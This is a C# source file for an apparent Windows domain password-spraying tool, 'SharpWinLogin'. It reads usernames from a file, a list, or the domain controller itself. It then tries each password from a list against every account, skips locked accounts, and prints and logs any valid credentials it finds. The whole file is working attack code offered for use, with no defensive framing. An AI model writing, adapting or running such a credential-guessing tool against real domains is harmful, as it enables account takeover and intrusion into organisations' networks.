using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Text;

namespace SharpWinLogin
{
    class Program
    {
        public static string logFile = "";
        public static string dc;
        public static List<string> usernameList;
        public static List<string> passwordList;
        public static int LockoutThreshold;
        static void Main(string[] args)
        {
            dc = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            parseArgs(args);
            foreach (string user in usernameList)
            {
                foreach(string password in passwordList)
                {
                    if (WinDomain.IsLockedOrDisabled(dc, user))
                    {
                        break;
                    }
                    if (WinDomain.WinLogin(user, password, dc))
                    {
                        Console.WriteLine(String.Format("[+] Found credentials {0}:{1}", user, password));
                        if (logFile != "") log(String.Format("[+] Found credentials {0}:{1}", user, password));
                        break;
                    }
                }
            }
        }
        private static void usage()
        {
            Console.WriteLine("SharpWinLogin.exe {usernameList} {passwordList} {lockoutThreshold} [outputFile]");
            Console.WriteLine(@"- usernameList: C:\\path\\to\\usernameList.txt or ""username1,username2"" or auto (to retrieve the username list from Domain Controller)");
            Console.WriteLine(@"- passwordList: C:\\path\\to\\passwordList.txt or ""password1,password2""");
            Console.WriteLine("- lockoutThreshold: n or 0 (for no lockout threshold)");
        }
        private static void log(string content)
        {
            try
            {
                File.AppendAllText(logFile, content + Environment.NewLine);
            }
            catch
            {
                //Console.WriteLine("Error writing file");
            }
        }
        private static void parseArgs(string[] args)
        {
            if (args.Length < 3)
            {
                usage();
                System.Environment.Exit(1);
            }
            else if (args.Length == 4)
            {
                logFile = args[3];
            }

            if (args[0] == "auto")
            {
                usernameList = WinDomain.GetUsers(dc);
            }
            else if (args[0].Contains(","))
            {
                usernameList = args[0].Split(',').ToList();
            }
            else
            {
                if (File.Exists(args[0]))
                {
                    usernameList = new List<string>();
                    string line;
                    System.IO.StreamReader file = new System.IO.StreamReader(args[0]);
                    while ((line = file.ReadLine()) != null)
                    {
                        usernameList.Add(line);
                    }
                    file.Close();
                }
                else
                {
                    Console.WriteLine("usernameList does not exist");
                    System.Environment.Exit(1);
                }
            }

            if (args[1].Contains(","))
            {
                passwordList = args[1].Split(',').ToList();
            }
            else
            {
                if (File.Exists(args[1]))
                {
                    passwordList = new List<string>();
                    string line;
                    System.IO.StreamReader file = new System.IO.StreamReader(args[1]);
                    while ((line = file.ReadLine()) != null)
                    {
                        passwordList.Add(line);
                    }
                    file.Close();
                }
                else
                {
                    Console.WriteLine("passwordList does not exist");
                    System.Environment.Exit(1);
                }
            }

            LockoutThreshold = int.Parse(args[2]);
        }
        
    }
}
